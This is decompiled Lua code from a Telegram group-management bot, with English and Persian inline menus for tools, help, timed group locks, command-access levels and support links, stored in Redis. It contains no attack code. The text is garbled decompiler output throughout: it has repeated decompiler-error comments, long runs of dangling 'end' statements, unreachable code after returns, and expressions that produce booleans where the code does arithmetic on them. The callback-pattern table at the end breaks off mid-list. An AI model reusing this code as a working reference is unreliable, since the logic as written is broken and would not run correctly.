                                                                                                        -- DECOMPILER ERROR at PC5345: Confused about usage of register: R4 in 'UnsetPending'

                                                                                                        keyboard.inline_keyboard = {
{
{text = "Help For This Part", callback_data = "HelpExpire:" .. matches[2]}
}
, 
{
{text = "Back To Group info", callback_data = "Info:" .. matches[2]}
}
, 
{
{text = "�\177 Back To Manager", callback_data = "Manager:" .. matches[2]}
}
}
                                                                                                        _ENV.expire = redis:ttl("ExpireDate:" .. matches[2]) or 0
                                                                                                        _ENV.days = ((_ENV.math).floor)(_ENV.expire / 86400) + 1
                                                                                                        text = "انقضا: `" .. _ENV.days .. "`"
                                                                                                        -- DECOMPILER ERROR at PC5407: Confused about usage of register: R4 in 'UnsetPending'

                                                                                                        keyboard.inline_keyboard = {
{
{text = "راهنما این بخش", callback_data = "HelpExpire:" .. matches[2]}
}
, 
{
{text = "برگشت به اطلاعات گروه", callback_data = "Info:" .. matches[2]}
}
, 
{
{text = "برگشت به مدیریت �\177", callback_data = "Manager:" .. matches[2]}
}
}
                                                                                                        edit_inline(msg.message_id, text, keyboard)
                                                                                                        if matches[1] == "HelpRules" then
                                                                                                          if not lang then
                                                                                                            return "Use /setrules For Change Text"
                                                                                                          else
                                                                                                            return "از /setrules برای تغییر متن استفاده کنید"
                                                                                                          end
                                                                                                        end
                                                                                                        if matches[1] == "HelpWelcome" then
                                                                                                          if not lang then
                                                                                                            return "Use /setwelcome For Change Text"
                                                                                                          else
                                                                                                            return "از /setwelcome برای تغییر متن استفاده کنید"
                                                                                                          end
                                                                                                        end
                                                                                                        if matches[1] == "HelpLink" then
                                                                                                          if not lang then
                                                                                                            return "Use /setlink or /newlink"
                                                                                                          else
                                                                                                            return "از /setlink یا /newlink استفاده کنید"
                                                                                                          end
                                                                                                        end
                                                                                                        if matches[1] == "HelpMods" then
                                                                                                          if not lang then
                                                                                                            return "Use /promote"
                                                                                                          else
                                                                                                            return "از /promote استفاده کنید"
                                                                                                          end
                                                                                                        end
                                                                                                        if matches[1] == "HelpAllow" then
                                                                                                          if not lang then
                                                                                                            return "Use /allow"
                                                                                                          else
                                                                                                            return "از /allow استفاده کنید"
                                                                                                          end
                                                                                                        end
                                                                                                        if matches[1] == "HelpFilterList" then
                                                                                                          if not lang then
                                                                                                            return "Use /filter or /filterlist"
                                                                                                          else
                                                                                                            return "از /filter و /filterlist استفاده کنید"
                                                                                                          end
                                                                                                        end
                                                                                                        if matches[1] == "HelpSilentList" then
                                                                                                          if not lang then
                                                                                                            return "Use /silent or /unsilent"
                                                                                                          else
                                                                                                            return "از /silent و /unsilent استفاده کنید"
                                                                                                          end
                                                                                                        end
                                                                                                        if matches[1] == "HelpBans" then
                                                                                                          if not lang then
                                                                                                            return "Use /ban For Ban User"
                                                                                                          else
                                                                                                            return "از /ban برای محروم کردن کاربر استفاده کنید"
                                                                                                          end
                                                                                                        end
                                                                                                        if matches[1] == "HelpExpire" then
                                                                                                          if not lang then
                                                                                                            return "Use /check"
                                                                                                          else
                                                                                                            return "از /check استفاده کنید"
                                                                                                          end
                                                                                                        end
                                                                                                        _ENV.GetTools = function(msg, chat)
    -- function num : 0_58_22 , upvalues : _ENV, lang
    keyboard = {}
    welcome = "✖️"
    sense = "✖️"
    withcaption = "✖️"
    nocaption = "✖️"
    if redis:hget("GroupSettings:" .. chat, "lock_withcaption") then
      withcaption = "☑️"
    end
    if redis:hget("GroupSettings:" .. chat, "lock_nocaption") then
      nocaption = "☑️"
    end
    if redis:get("SettingsWelcomeFor" .. chat) then
      welcome = "☑️"
    end
    if redis:get("sense:" .. chat) then
      sense = "☑️"
    end
    if not lang then
      reaction = "Kick User"
      if redis:hget("GroupSettings:" .. chat, "flood_reaction") then
        reaction = "Delete Message"
      end
      text = "`Use An item For Change Status:`"
      -- DECOMPILER ERROR at PC165: Confused about usage of register: R2 in 'UnsetPending'

      keyboard.inline_keyboard = {
{
{text = "Group Welcome", callback_data = "ToolsWelcome:" .. chat}
, 
{text = welcome, callback_data = "NoProcess:" .. chat}
}
, 
{
{text = "Bot Sense", callback_data = "ToolsSense:" .. chat}
, 
{text = sense, callback_data = "NoProcess:" .. chat}
}
, 
{
{text = "Post With Caption", callback_data = "ToolsWithCaption:" .. chat}
, 
{text = withcaption, callback_data = "NoProcess:" .. chat}
}
, 
{
{text = "Post Without Caption", callback_data = "ToolsNoCaption:" .. chat}
, 
{text = nocaption, callback_data = "NoProcess:" .. chat}
}
, 
{
{text = "Flood Reaction: " .. reaction, callback_data = "ToolsReaction:" .. chat}
}
, 
{
{text = "Bot Access Commands", callback_data = "ToolsCmds:" .. chat}
}
, 
{
{text = "Bot Helps Part", callback_data = "ToolsHelp:" .. chat}
}
, 
{
{text = "Group Timely Lock", callback_data = "ToolsLockgp:" .. chat}
}
, 
{
{text = "�\177 Back To Manager", callback_data = "Manager:" .. chat}
}
}
    else
      reaction = "اخراج کاربر"
      if redis:hget("GroupSettings:" .. chat, "flood_reaction") then
        reaction = "حذف پیام"
      end
      text = "`یک بخش را برای تغییر وضعیت انتخاب کنید:`"
      -- DECOMPILER ERROR at PC285: Confused about usage of register: R2 in 'UnsetPending'

      keyboard.inline_keyboard = {
{
{text = "خوش آمد گویی", callback_data = "ToolsWelcome:" .. chat}
, 
{text = welcome, callback_data = "NoProcess:" .. chat}
}
, 
{
{text = "هوش مصنوعی", callback_data = "ToolsSense:" .. chat}
, 
{text = sense, callback_data = "NoProcess:" .. chat}
}
, 
{
{text = "پست زیرنویس دار", callback_data = "ToolsWithCaption:" .. chat}
, 
{text = withcaption, callback_data = "NoProcess:" .. chat}
}
, 
{
{text = "پست بدون زیرنویس", callback_data = "ToolsNoCaption:" .. chat}
, 
{text = nocaption, callback_data = "NoProcess:" .. chat}
}
, 
{
{text = "واکنش پیام رگباری: " .. reaction, callback_data = "ToolsReaction:" .. chat}
}
, 
{
{text = "دسترسی دستورات ربات", callback_data = "ToolsCmds:" .. chat}
}
, 
{
{text = "بخش راهنمای ربات", callback_data = "ToolsHelp:" .. chat}
}
, 
{
{text = "قفل موقتی گروه", callback_data = "ToolsLockgp:" .. chat}
}
, 
{
{text = "برگشت به مدیریت �\177", callback_data = "Manager:" .. chat}
}
}
    end
    edit_inline(msg.message_id, text, keyboard)
  end

                                                                                                        if matches[1] == "Tools" then
                                                                                                          (_ENV.GetTools)(msg, matches[2])
                                                                                                        end
                                                                                                        if matches[1] == "ToolsWelcome" then
                                                                                                          _ENV.welcome = redis:get("SettingsWelcomeFor" .. matches[2])
                                                                                                          if _ENV.welcome then
                                                                                                            redis:del("SettingsWelcomeFor" .. matches[2])
                                                                                                            ;
                                                                                                            (_ENV.GetTools)(msg, matches[2])
                                                                                                            if not lang then
                                                                                                              return "Welcome Has Been Disabled!"
                                                                                                            else
                                                                                                              return "خوش آمد گویی غیر فعال شد!"
                                                                                                            end
                                                                                                          else
                                                                                                            redis:set("SettingsWelcomeFor" .. matches[2], true)
                                                                                                            ;
                                                                                                            (_ENV.GetTools)(msg, matches[2])
                                                                                                            if not lang then
                                                                                                              return "Welcome Has Been Enabled!"
                                                                                                            else
                                                                                                              return "خوش آمد گویی فعال شد!"
                                                                                                            end
                                                                                                          end
                                                                                                        end
                                                                                                        if matches[1] == "ToolsSense" then
                                                                                                          _ENV.sense = redis:get("sense:" .. matches[2])
                                                                                                          if _ENV.sense then
                                                                                                            redis:del("sense:" .. matches[2])
                                                                                                            ;
                                                                                                            (_ENV.GetTools)(msg, matches[2])
                                                                                                            if not lang then
                                                                                                              return "Sense Has Been Disabled!"
                                                                                                            else
                                                                                                              return "هوش مصنوعی غیر فعال شد!"
                                                                                                            end
                                                                                                          else
                                                                                                            redis:set("sense:" .. matches[2], true)
                                                                                                            ;
                                                                                                            (_ENV.GetTools)(msg, matches[2])
                                                                                                            if not lang then
                                                                                                              return "Sense Has Been Enabled!"
                                                                                                            else
                                                                                                              return "هوش مصنوعی فعال شد!"
                                                                                                            end
                                                                                                          end
                                                                                                        end
                                                                                                        if matches[1] == "ToolsReaction" then
                                                                                                          _ENV.String = redis:hget("GroupSettings:" .. matches[2], "flood_reaction")
                                                                                                          if _ENV.String then
                                                                                                            redis:hdel("GroupSettings:" .. matches[2], "flood_reaction")
                                                                                                            ;
                                                                                                            (_ENV.GetTools)(msg, matches[2])
                                                                                                            if not lang then
                                                                                                              return "Flood Reaction Changed To Kick User!"
                                                                                                            else
                                                                                                              return "واکنش پیام رگباری به اخراج کاربر تغییر کرد!"
                                                                                                            end
                                                                                                          else
                                                                                                            redis:hset("GroupSettings:" .. matches[2], "flood_reaction", "yes")
                                                                                                            ;
                                                                                                            (_ENV.GetTools)(msg, matches[2])
                                                                                                            if not lang then
                                                                                                              return "Flood Reaction Changed To Delete Message!"
                                                                                                            else
                                                                                                              return "واکنش پیام رگباری به حذف پیام تغییر کرد!"
                                                                                                            end
                                                                                                          end
                                                                                                        end
                                                                                                        if matches[1] == "ToolsWithCaption" then
                                                                                                          _ENV.String = redis:hget("GroupSettings:" .. matches[2], "lock_withcaption")
                                                                                                          if _ENV.String then
                                                                                                            redis:hdel("GroupSettings:" .. matches[2], "lock_withcaption")
                                                                                                            ;
                                                                                                            (_ENV.GetTools)(msg, matches[2])
                                                                                                            if not lang then
                                                                                                              return "Post With Caption Has Been Disabled!"
                                                                                                            else
                                                                                                              return "پست زیرنویس دار غیر فعال شد!"
                                                                                                            end
                                                                                                          else
                                                                                                            redis:hdel("GroupSettings:" .. matches[2], "lock_nocaption")
                                                                                                            redis:hset("GroupSettings:" .. matches[2], "lock_withcaption", "yes")
                                                                                                            ;
                                                                                                            (_ENV.GetTools)(msg, matches[2])
                                                                                                            if not lang then
                                                                                                              return "Post With Caption Has Been Enabled!"
                                                                                                            else
                                                                                                              return "پست زیرنویس دار فعال شد!"
                                                                                                            end
                                                                                                          end
                                                                                                        end
                                                                                                        if matches[1] == "ToolsNoCaption" then
                                                                                                          _ENV.String = redis:hget("GroupSettings:" .. matches[2], "lock_nocaption")
                                                                                                          if _ENV.String then
                                                                                                            redis:hdel("GroupSettings:" .. matches[2], "lock_nocaption")
                                                                                                            ;
                                                                                                            (_ENV.GetTools)(msg, matches[2])
                                                                                                            if not lang then
                                                                                                              return "Post Without Caption Has Been Disabled!"
                                                                                                            else
                                                                                                              return "پست بدون زیرنویس غیر فعال شد!"
                                                                                                            end
                                                                                                          else
                                                                                                            redis:hdel("GroupSettings:" .. matches[2], "lock_withcaption")
                                                                                                            redis:hset("GroupSettings:" .. matches[2], "lock_nocaption", "yes")
                                                                                                            ;
                                                                                                            (_ENV.GetTools)(msg, matches[2])
                                                                                                            if not lang then
                                                                                                              return "Post Without Caption Has Been Enabled!"
                                                                                                            else
                                                                                                              return "پست بدون زیرنویس فعال شد!"
                                                                                                            end
                                                                                                          end
                                                                                                        end
                                                                                                        if matches[1] == "ToolsHelp" then
                                                                                                          keyboard = {}
                                                                                                          if not lang then
                                                                                                            text = "`Choose Rank:`"
                                                                                                            -- DECOMPILER ERROR at PC5871: Confused about usage of register: R4 in 'UnsetPending'

                                                                                                            keyboard.inline_keyboard = {
{
{text = "Sudo", callback_data = "Help:Sudo:" .. matches[2]}
, 
{text = "Owner", callback_data = "Help:Owner:" .. matches[2]}
, 
{text = "Moderator", callback_data = "Help:Mods:" .. matches[2]}
}
, 
{
{text = "Back To other Tools", callback_data = "Tools:" .. matches[2]}
}
, 
{
{text = "�\177 Back To Manager", callback_data = "Manager:" .. matches[2]}
}
}
                                                                                                          else
                                                                                                            text = "`مقام را انتخاب کنید:`"
                                                                                                            -- DECOMPILER ERROR at PC5919: Confused about usage of register: R4 in 'UnsetPending'

                                                                                                            keyboard.inline_keyboard = {
{
{text = "سودو", callback_data = "Help:Sudo:" .. matches[2]}
, 
{text = "مالک گروه", callback_data = "Help:Owner:" .. matches[2]}
, 
{text = "مدیر", callback_data = "Help:Mods:" .. matches[2]}
}
, 
{
{text = "برگشت به سایر ابزار ها", callback_data = "Tools:" .. matches[2]}
}
, 
{
{text = "برگشت به مدیریت �\177", callback_data = "Manager:" .. matches[2]}
}
}
                                                                                                          end
                                                                                                          edit_inline(msg.message_id, text, keyboard)
                                                                                                        end
                                                                                                        if matches[1] == "Help:Sudo" then
                                                                                                          keyboard = {}
                                                                                                          if not lang then
                                                                                                            text = ((_ENV.GetCmds)(redis:get("gp_lang:" .. matches[2]))).HelpForSudo
                                                                                                            -- DECOMPILER ERROR at PC5989: Confused about usage of register: R4 in 'UnsetPending'

                                                                                                            keyboard.inline_keyboard = {
{
{text = "Sudo", callback_data = "Help:Sudo:" .. matches[2]}
, 
{text = "Owner", callback_data = "Help:Owner:" .. matches[2]}
, 
{text = "Moderator", callback_data = "Help:Mods:" .. matches[2]}
}
, 
{
{text = "Back To other Tools", callback_data = "Tools:" .. matches[2]}
}
, 
{
{text = "�\177 Back To Manager", callback_data = "Manager:" .. matches[2]}
}
}
                                                                                                          else
                                                                                                            text = ((_ENV.GetCmds)(redis:get("gp_lang:" .. matches[2]))).HelpForSudo
                                                                                                            -- DECOMPILER ERROR at PC6047: Confused about usage of register: R4 in 'UnsetPending'

                                                                                                            keyboard.inline_keyboard = {
{
{text = "سودو", callback_data = "Help:Sudo:" .. matches[2]}
, 
{text = "مالک گروه", callback_data = "Help:Owner:" .. matches[2]}
, 
{text = "مدیر", callback_data = "Help:Mods:" .. matches[2]}
}
, 
{
{text = "برگشت به سایر ابزار ها", callback_data = "Tools:" .. matches[2]}
}
, 
{
{text = "برگشت به مدیریت �\177", callback_data = "Manager:" .. matches[2]}
}
}
                                                                                                          end
                                                                                                          edit_inline(msg.message_id, text, keyboard)
                                                                                                        end
                                                                                                        if matches[1] == "Help:Owner" then
                                                                                                          keyboard = {}
                                                                                                          if not lang then
                                                                                                            text = ((_ENV.GetCmds)(redis:get("gp_lang:" .. matches[2]))).HelpForOwner
                                                                                                            -- DECOMPILER ERROR at PC6117: Confused about usage of register: R4 in 'UnsetPending'

                                                                                                            keyboard.inline_keyboard = {
{
{text = "Sudo", callback_data = "Help:Sudo:" .. matches[2]}
, 
{text = "Owner", callback_data = "Help:Owner:" .. matches[2]}
, 
{text = "Moderator", callback_data = "Help:Mods:" .. matches[2]}
}
, 
{
{text = "Back To other Tools", callback_data = "Tools:" .. matches[2]}
}
, 
{
{text = "�\177 Back To Manager", callback_data = "Manager:" .. matches[2]}
}
}
                                                                                                          else
                                                                                                            text = ((_ENV.GetCmds)(redis:get("gp_lang:" .. matches[2]))).HelpForOwner
                                                                                                            -- DECOMPILER ERROR at PC6175: Confused about usage of register: R4 in 'UnsetPending'

                                                                                                            keyboard.inline_keyboard = {
{
{text = "سودو", callback_data = "Help:Sudo:" .. matches[2]}
, 
{text = "مالک گروه", callback_data = "Help:Owner:" .. matches[2]}
, 
{text = "مدیر", callback_data = "Help:Mods:" .. matches[2]}
}
, 
{
{text = "برگشت به سایر ابزار ها", callback_data = "Tools:" .. matches[2]}
}
, 
{
{text = "برگشت به مدیریت �\177", callback_data = "Manager:" .. matches[2]}
}
}
                                                                                                          end
                                                                                                          edit_inline(msg.message_id, text, keyboard)
                                                                                                        end
                                                                                                        if matches[1] == "Help:Mods" then
                                                                                                          keyboard = {}
                                                                                                          if not lang then
                                                                                                            text = ((_ENV.GetCmds)(redis:get("gp_lang:" .. matches[2]))).HelpForModerator
                                                                                                            -- DECOMPILER ERROR at PC6245: Confused about usage of register: R4 in 'UnsetPending'

                                                                                                            keyboard.inline_keyboard = {
{
{text = "Sudo", callback_data = "Help:Sudo:" .. matches[2]}
, 
{text = "Owner", callback_data = "Help:Owner:" .. matches[2]}
, 
{text = "Moderator", callback_data = "Help:Mods:" .. matches[2]}
}
, 
{
{text = "Back To other Tools", callback_data = "Tools:" .. matches[2]}
}
, 
{
{text = "�\177 Back To Manager", callback_data = "Manager:" .. matches[2]}
}
}
                                                                                                          else
                                                                                                            text = ((_ENV.GetCmds)(redis:get("gp_lang:" .. matches[2]))).HelpForModerator
                                                                                                            -- DECOMPILER ERROR at PC6303: Confused about usage of register: R4 in 'UnsetPending'

                                                                                                            keyboard.inline_keyboard = {
{
{text = "سودو", callback_data = "Help:Sudo:" .. matches[2]}
, 
{text = "مالک گروه", callback_data = "Help:Owner:" .. matches[2]}
, 
{text = "مدیر", callback_data = "Help:Mods:" .. matches[2]}
}
, 
{
{text = "برگشت به سایر ابزار ها", callback_data = "Tools:" .. matches[2]}
}
, 
{
{text = "برگشت به مدیریت �\177", callback_data = "Manager:" .. matches[2]}
}
}
                                                                                                          end
                                                                                                          edit_inline(msg.message_id, text, keyboard)
                                                                                                        end
                                                                                                        _ENV.GetToolsLockgp = function(msg, chat)
    -- function num : 0_58_23 , upvalues : _ENV, lang
    keyboard = {}
    String = tonumber(redis:get("GetInputTimeFor:" .. chat)) or 1
    if not lang then
      text = "`Please Use An item:`"
      -- DECOMPILER ERROR at PC76: Confused about usage of register: R2 in 'UnsetPending'

      keyboard.inline_keyboard = {
{
{text = "<<", callback_data = "-Lockgp:" .. chat}
, 
{text = String .. " Hour", callback_data = "NoProcess:" .. chat}
, 
{text = ">>", callback_data = "+Lockgp:" .. chat}
}
, 
{
{text = "Apply Lock", callback_data = "Applylockgp:" .. chat}
}
, 
{
{text = "Unlock Group", callback_data = "Unlockgp:" .. chat}
}
, 
{
{text = "Back To other Tools", callback_data = "Tools:" .. chat}
}
, 
{
{text = "�\177 Back To Manager", callback_data = "Manager:" .. chat}
}
}
    else
      text = "`لطفا یک بخش را انتخاب کنید:`"
      -- DECOMPILER ERROR at PC137: Confused about usage of register: R2 in 'UnsetPending'

      keyboard.inline_keyboard = {
{
{text = "<<", callback_data = "-Lockgp:" .. chat}
, 
{text = String .. " ساعت", callback_data = "NoProcess:" .. chat}
, 
{text = ">>", callback_data = "+Lockgp:" .. chat}
}
, 
{
{text = "اعمال کردن قفل", callback_data = "Applylockgp:" .. chat}
}
, 
{
{text = "بازکردن گروه", callback_data = "Unlockgp:" .. chat}
}
, 
{
{text = "برگشت به سایر ابزار ها", callback_data = "Tools:" .. chat}
}
, 
{
{text = "�\177 برگشت به مدیریت", callback_data = "Manager:" .. chat}
}
}
    end
    edit_inline(msg.message_id, text, keyboard)
  end

                                                                                                        if matches[1] == "ToolsLockgp" then
                                                                                                          if not is_owner(matches[2], (msg.from).id) then
                                                                                                            get_alert(msg.cb_id, ErrorAccess)
                                                                                                          else
                                                                                                            ;
                                                                                                            (_ENV.GetToolsLockgp)(msg, matches[2])
                                                                                                          end
                                                                                                        end
                                                                                                        if not tonumber(redis:get("GetInputTimeFor:" .. matches[2])) then
                                                                                                          _ENV.String = matches[1] ~= "-Lockgp" or not is_owner(matches[2], (msg.from).id) or 1
                                                                                                          if _ENV.String - 1 < 1 then
                                                                                                            if not lang then
                                                                                                              return "Input Number is Not Correct!"
                                                                                                            else
                                                                                                              return "تعداد ورودی صحیح نیست!"
                                                                                                            end
                                                                                                          else
                                                                                                            if _ENV.String - 1 >= 1 then
                                                                                                              redis:set("GetInputTimeFor:" .. matches[2], _ENV.String - 1)
                                                                                                              ;
                                                                                                              (_ENV.GetToolsLockgp)(msg, matches[2])
                                                                                                            end
                                                                                                          end
                                                                                                          if not tonumber(redis:get("GetInputTimeFor:" .. matches[2])) then
                                                                                                            _ENV.String = matches[1] ~= "+Lockgp" or not is_owner(matches[2], (msg.from).id) or 1
                                                                                                            redis:set("GetInputTimeFor:" .. matches[2], _ENV.String + 1)
                                                                                                            ;
                                                                                                            (_ENV.GetToolsLockgp)(msg, matches[2])
                                                                                                            if not tonumber(redis:get("GetInputTimeFor:" .. matches[2])) then
                                                                                                              _ENV.String = matches[1] ~= "Applylockgp" or not is_owner(matches[2], (msg.from).id) or 1
                                                                                                              _ENV.T = _ENV.String * 3600
                                                                                                              redis:setex("~LockGroup~" .. matches[2], _ENV.T, true)
                                                                                                              if not lang then
                                                                                                                return "Group Locked For " .. _ENV.String .. " Hour!"
                                                                                                              else
                                                                                                                return "گروه برای " .. _ENV.String .. " ساعت قفل شد!"
                                                                                                              end
                                                                                                              if matches[1] == "Unlockgp" and is_owner(matches[2], (msg.from).id) then
                                                                                                                _ENV.String = redis:get("~LockGroup~" .. matches[2])
                                                                                                                if _ENV.String then
                                                                                                                  redis:del("~LockGroup~" .. matches[2])
                                                                                                                  if not lang then
                                                                                                                    return "Group Unlocked!"
                                                                                                                  else
                                                                                                                    return "گروه باز شد!"
                                                                                                                  end
                                                                                                                else
                                                                                                                  if not lang then
                                                                                                                    return "Group is Not Locked!"
                                                                                                                  else
                                                                                                                    return "گروه قفل نبود!"
                                                                                                                  end
                                                                                                                end
                                                                                                              end
                                                                                                              _ENV.GetToolsCmds = function(msg, chat)
    -- function num : 0_58_24 , upvalues : _ENV, lang
    keyboard = {}
    String = redis:get("GroupCmdsAccess:" .. chat)
    if not lang then
      text = "`Bot Commands:`\n\n"
      if String == "owner" then
        text = text .. "Owner and Higher"
      else
        if String == "moderator" then
          text = text .. "Moderators and Higher"
        else
          text = text .. "Members and Higher"
        end
      end
      -- DECOMPILER ERROR at PC72: Confused about usage of register: R2 in 'UnsetPending'

      keyboard.inline_keyboard = {
{
{text = "All", callback_data = "Cmds1:" .. chat}
, 
{text = "Moderator", callback_data = "Cmds2:" .. chat}
, 
{text = "Group owner", callback_data = "Cmds3:" .. chat}
}
, 
{
{text = "Back To other Tools", callback_data = "Tools:" .. chat}
}
, 
{
{text = "�\177 Back To Manager", callback_data = "Manager:" .. chat}
}
}
    else
      text = "`دستورات ربات:`\n\n"
      if String == "owner" then
        text = text .. "مالک گروه و بالاتر"
      else
        if String == "moderator" then
          text = text .. "مدیران گروه و بالاتر"
        else
          text = text .. "آزاد برای همه"
        end
      end
      -- DECOMPILER ERROR at PC134: Confused about usage of register: R2 in 'UnsetPending'

      keyboard.inline_keyboard = {
{
{text = "همه", callback_data = "Cmds1:" .. chat}
, 
{text = "مدیر", callback_data = "Cmds2:" .. chat}
, 
{text = "مالک گروه", callback_data = "Cmds3:" .. chat}
}
, 
{
{text = "برگشت به سایر ابزار ها", callback_data = "Tools:" .. chat}
}
, 
{
{text = "برگشت به مدیریت �\177", callback_data = "Manager:" .. chat}
}
}
    end
    edit_inline(msg.message_id, text, keyboard)
  end

                                                                                                              if matches[1] == "ToolsCmds" then
                                                                                                                if not is_owner(matches[2], (msg.from).id) then
                                                                                                                  get_alert(msg.cb_id, ErrorAccess)
                                                                                                                else
                                                                                                                  ;
                                                                                                                  (_ENV.GetToolsCmds)(msg, matches[2])
                                                                                                                end
                                                                                                              end
                                                                                                              if matches[1] == "Cmds1" and is_owner(matches[2], (msg.from).id) then
                                                                                                                redis:del("GroupCmdsAccess:" .. matches[2])
                                                                                                                ;
                                                                                                                (_ENV.GetToolsCmds)(msg, matches[2])
                                                                                                                if not lang then
                                                                                                                  return "Applied"
                                                                                                                else
                                                                                                                  return "اعمال شد"
                                                                                                                end
                                                                                                              end
                                                                                                              if matches[1] == "Cmds2" and is_owner(matches[2], (msg.from).id) then
                                                                                                                redis:set("GroupCmdsAccess:" .. matches[2], "moderator")
                                                                                                                ;
                                                                                                                (_ENV.GetToolsCmds)(msg, matches[2])
                                                                                                                if not lang then
                                                                                                                  return "Applied"
                                                                                                                else
                                                                                                                  return "اعمال شد"
                                                                                                                end
                                                                                                              end
                                                                                                              if matches[1] == "Cmds3" and is_owner(matches[2], (msg.from).id) then
                                                                                                                redis:set("GroupCmdsAccess:" .. matches[2], "owner")
                                                                                                                ;
                                                                                                                (_ENV.GetToolsCmds)(msg, matches[2])
                                                                                                                if not lang then
                                                                                                                  return "Applied"
                                                                                                                else
                                                                                                                  return "اعمال شد"
                                                                                                                end
                                                                                                              end
                                                                                                              if matches[1] == "Support" then
                                                                                                                keyboard = {}
                                                                                                                if not redis:get("BotNerkh=") then
                                                                                                                  text = lang or "`Nerkh Text is Not Set!`"
                                                                                                                  -- DECOMPILER ERROR at PC6685: Confused about usage of register: R4 in 'UnsetPending'

                                                                                                                  keyboard.inline_keyboard = {
{
{text = "Join Support Groups", callback_data = "Supportgp:" .. matches[2]}
}
, 
{
{text = "♻️ Refresh This Page", callback_data = "Support:" .. matches[2]}
}
, 
{
{text = "�\177 Back To Manager", callback_data = "Manager:" .. matches[2]}
}
}
                                                                                                                  text = redis:get("BotNerkh=") or "`متن نرخ تنظیم نشده است!`"
                                                                                                                  -- DECOMPILER ERROR at PC6725: Confused about usage of register: R4 in 'UnsetPending'

                                                                                                                  keyboard.inline_keyboard = {
{
{text = "ورود به گروه پشتیبانی", callback_data = "Supportgp:" .. matches[2]}
}
, 
{
{text = "♻️ تازه سازی این صفحه", callback_data = "Support:" .. matches[2]}
}
, 
{
{text = "برگشت به مدیریت �\177", callback_data = "Manager:" .. matches[2]}
}
}
                                                                                                                  edit_inline(msg.message_id, text, keyboard)
                                                                                                                  if matches[1] == "Supportgp" then
                                                                                                                    keyboard = {}
                                                                                                                    if not lang then
                                                                                                                      if redis:get("EditBot:supportgp") then
                                                                                                                        text = "Support Group:\n\n" .. redis:get("EditBot:supportgp")
                                                                                                                      else
                                                                                                                        text = "Support Group is Not Set!"
                                                                                                                      end
                                                                                                                      -- DECOMPILER ERROR at PC6776: Confused about usage of register: R4 in 'UnsetPending'

                                                                                                                      keyboard.inline_keyboard = {
{
{text = "Back To Support Part", callback_data = "Support:" .. matches[2]}
}
, 
{
{text = "�\177 Back To Manager", callback_data = "Manager:" .. matches[2]}
}
}
                                                                                                                    else
                                                                                                                      if redis:get("EditBot:supportgp") then
                                                                                                                        text = "گروه پشتیبانی:\n\n" .. redis:get("EditBot:supportgp")
                                                                                                                      else
                                                                                                                        text = "گروه پشتیبانی ثبت نشده است!"
                                                                                                                      end
                                                                                                                      -- DECOMPILER ERROR at PC6815: Confused about usage of register: R4 in 'UnsetPending'

                                                                                                                      keyboard.inline_keyboard = {
{
{text = "برگشت به بخش پشتیبانی", callback_data = "Support:" .. matches[2]}
}
, 
{
{text = "برگشت به مدیریت �\177", callback_data = "Manager:" .. matches[2]}
}
}
                                                                                                                    end
                                                                                                                    edit_inline(msg.message_id, text, keyboard, true)
                                                                                                                  end
                                                                                                                end
                                                                                                              end
                                                                                                            end
                                                                                                          end
                                                                                                        end
                                                                                                      end
                                                                                                    end
                                                                                                  end
                                                                                                end
                                                                                              end
                                                                                            end
                                                                                          end
                                                                                        end
                                                                                      end
                                                                                    end
                                                                                  end
                                                                                end
                                                                              end
                                                                            end
                                                                          end
                                                                        end
                                                                      end
                                                                    end
                                                                  end
                                                                end
                                                              end
                                                            end
                                                          end
                                                        end
                                                      end
                                                    end
                                                  end
                                                end
                                              end
                                            end
                                          end
                                        end
                                      end
                                    end
                                  end
                                end
                              end
                            end
                          end
                        end
                      end
                    end
                  end
                end
              end
            end
          end
        end
      end
    end
  end
end

_config = (loadfile("./data/config.lua"))()
return {
inline = {"^-(%d+)$", "^(reload)$", "^###cb:(%d+)$", "^###cb:(NoProcess):(.*)$", "^###cb:(Tools):(.*)$", "^###cb:(ToolsWelcome):(.*)$", "^###cb:(ToolsSense):(.*)$", "^###cb:(ToolsWithCaption):(.*)$", "^###cb:(ToolsNoCaption):(.*)$", "^###cb:(ToolsReaction):(.*)$", "^###cb:(ToolsCmds):(.*)$", "^###cb:(ToolsHelp):(.*)$", "^###cb:(Help:Sudo):(.*)$", "^###cb:(Help:Owner):(.*)$", "^###cb:(Help:Mods):(.*)$", "^###cb:(Cmds1):(.*)$", "^###cb:(Cmds2):(.*)$", "^###cb:(Cmds3):(.*)$", "^###cb:(ToolsLockgp):(.*)$", "^###cb:(-Lockgp):(.*)$", "^###cb:(+Lockgp):(.*)$", "^###cb:(Applylockgp):(.*)$", "^###cb:(Unlockgp):(.*)$", "^###cb:(Support):(.*)$", "^###cb:(Supportgp):(.*)$", "^###cb:(HelpLink):(.*)$", "^###cb:(HelpRules):(.*)$", "^###cb:(HelpWelcome):(.*)$", "^###cb:(HelpMods):(.*)$", "^###cb:(HelpAllow):(.*)$", "^###cb:(HelpFilterList):(.*)$", "^###cb:(HelpSilentList):(.*)$", "^###cb:(HelpBans):(.*)$", "^###cb:(HelpExpire):(.*)$", "^###cb:(Info):(.*)$", "^###cb:(InfoRules):(.*)$", "^###cb:(InfoWelcome):(.*)$", "^###cb:(InfoLink):(.*)$", "^###cb:(InfoAllow):(.*)$", "^###cb:(InfoMods):(.*)$", "^###cb:(InfoFilterList):(.*)$", "^###cb:(InfoSilentList):(.*)$", "^###cb:(InfoBans):(.*)$", "^###cb:(InfoExpire):(.*)$", "^###cb:(Cleans):(.*)$", "^###cb:(Cleans2):(.*)$", "^###cb:(CleanMods):(.*)$", "^###cb:(CleanAllow):(.*)$", "^###cb:(CleanFilterList):(.*)$", "^###cb:(CleanRules):(.*)$", "^###cb:(CleanWelcome):(.*)$", "^###cb:(CleanBans):(.*)$", "^###cb:(CleanSilentList):(.*)$", "^###cb:(Settings):(.*)$", "^###cb:(Settings2):(.*)$", "^###cb:(Settings3):(.*)$", "^###cb:(Settings4):(.*)$", "^###cb:(-5Flood):(.*)$", "^###cb:(-1Flood):(.*)$", "^###cb:(+1Flood):(.*)$", "^###cb:(+5Flood):(.*)$", "^###cb:(-5MaxWarn):(.*)$", "^###cb:(-1MaxWarn):(.*)$", "^###cb:(+1MaxWarn):(.*)$", "^###cb:(+5MaxWarn):(.*)$", "^###cb:(-100MaxWords):(.*)$", "^###cb:(-10MaxWords):(.*)$", "^###cb:(+10MaxWords):(.*)$", "^###cb:(+100MaxWords):(.*)$", "^###cb:(-5Forced):(.*)$", "^###cb:(-1Forced):(.*)$", "^###cb:(+1Forced):(.*)$", "^###cb:(+5Forced):(.*)$", "^###cb:(-5FloodTime):(.*)$", "^###cb:(-1FloodTime):(.*)$", 